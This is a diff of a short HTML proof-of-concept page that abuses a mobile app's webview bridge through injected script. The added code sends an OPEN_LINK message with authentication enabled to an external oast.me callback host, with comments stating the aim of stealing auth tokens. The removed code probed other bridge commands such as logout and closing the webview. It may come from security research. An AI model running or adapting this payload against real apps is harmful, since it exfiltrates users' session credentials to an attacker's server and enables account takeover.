@@ -1,36 +1,23 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// OPEN_NATIVE_SHARING - try multiple format variations
-// Since OPEN_LINK worked with payload wrapper, this should too
-// But maybe the issue is the field values
+// CONFIRMED: OPEN_LINK works.
+// Test needAuth=true - does it send auth cookies/tokens with the request?
+// If yes, our server receives an authenticated request = token theft
 
-var attempts = [
-  // Original format (payload wrapper)
-  {type:"OPEN_NATIVE_SHARING", trackId:"s1", payload:{text:"XSS PoC by r4dl3", mimeType:"text/plain"}},
+// Open attacker URL WITH authentication
+window.__plusSDKMobileCompat.onMessage(JSON.stringify({
+  type: "OPEN_LINK",
+  trackId: "auth-steal",
+  payload: {
+    url: "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/auth-link-test",
+    urlType: "WEBLINK",
+    openType: "OUT",
+    needAuth: true
+  }
+}));
 
-  // With title
-  {type:"OPEN_NATIVE_SHARING", trackId:"s2", payload:{title:"Test", text:"XSS PoC", mimeType:"text/plain"}},
-
-  // Without payload wrapper (flat)
-  {type:"OPEN_NATIVE_SHARING", trackId:"s3", text:"XSS PoC", mimeType:"text/plain"},
-
-  // Try NATIVE_VIBRATE_REQUEST instead (simpler - only vibrateType)
-  {type:"NATIVE_VIBRATE_REQUEST", trackId:"v1", payload:{vibrateType:"HEAVY"}},
-
-  // Try CLOSE_CURRENT_WEBVIEW (simplest - no fields needed)
-  {type:"CLOSE_CURRENT_WEBVIEW", trackId:"cl1", payload:{}},
-
-  // Try OPEN_LOG_OUT_REQUEST (no fields)
-  {type:"OPEN_LOG_OUT_REQUEST", trackId:"lo1", payload:{}},
-];
-
-attempts.forEach(function(msg, i) {
-  setTimeout(function(){
-    window.__plusSDKMobileCompat.onMessage(JSON.stringify(msg));
-    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/attempt-" + i + "-" + msg.type);
-  }, i * 1500);
-});
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/poc-sent");
 </script>
 </body>
 </html>
